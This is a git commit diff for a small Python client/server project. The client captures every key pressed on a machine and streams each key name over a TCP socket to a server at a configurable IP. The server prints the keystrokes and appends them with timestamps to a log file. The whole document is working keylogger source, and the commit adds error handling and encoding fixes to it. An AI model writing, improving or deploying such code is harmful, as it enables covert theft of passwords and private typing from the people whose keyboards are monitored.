90e2c6bffaa15d4245c9a9a01d5ea3d8dc29cd54
heitorPrDev <herohecttorplay@gmail.com>
2024-06-30 18:39:06 -0300

    1.5.2-Pequenos Ajustes-

--- mainCliente.py
+++ mainCliente.py
@@ -1,19 +1,27 @@
 
 import keyboard
 import socket
+import os
 host = 'localhost' # IP do Computador do servidor
 port = 8082 # Porta do computador com servidor
 server = (host,port)
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock.connect(server)
 
-
     
 def keypress(event):
-    if event.name:
-        sock.send(bytes(str(event.name), 'utf-8'))
-            
     
-
+    if event.name:
+        
+        try:
+            sock.send(bytes(str(event.name), 'utf-8'))
+            
+        except OSError:
+            sock.close()
+            os.abort()
+        except KeyboardInterrupt:
+            sock.close()
+            os.abort()
+  
 keyboard.on_press(keypress)
-keyboard.wait()
+keyboard.wait() 
--- server.py
+++ server.py
@@ -14,12 +14,11 @@ sock.listen(1)
 conn, docl = sock.accept()
 
 if docl:
-    
-    print(f'\033[1;32m\n  servidor iniciado na maquina {docl[0]}')
-    print('='*45)
+    print(f'\033[1;32m\n  Conectado em {docl[0]}')
+    print('='*26)
     print('\033[m')
-    with open('log.txt', 'a') as cli:
-        cli.write(f'\n  servidor iniciado na maquina {docl[0]}\n{'='*45}\n')
+    with open('log.txt', 'a',encoding='utf-8') as cli:
+        cli.write(f'\n  Conectado em {docl[0]}\n{'='*26}\n')
 while True:
     try:
         Menss_Rec = str(conn.recv(1024), 'utf-8')
@@ -27,13 +26,15 @@ while True:
         if Menss_Rec:
             timenow = datetime.now()
             print(f'[{timenow.strftime('%d/%m/%Y, %H:%M:%S')}]\033[1;31m -> \033[m{Menss_Rec}')
-            with open('log.txt','a') as keys:
+            with open('log.txt','a',encoding='utf-8') as keys:
                 keys.write(f'\n[{timenow.strftime('%d/%m/%Y, %H:%M:%S')}] -> {Menss_Rec}')
     except ConnectionResetError:
         print('\n\033[1;31mhost remoto cancelou a execução\033[m')
+        conn.close()
         break
     except KeyboardInterrupt:
         print('\n\033[1;31mvocê cancelou a execução\033[m')
+        conn.close()
         break
 
 
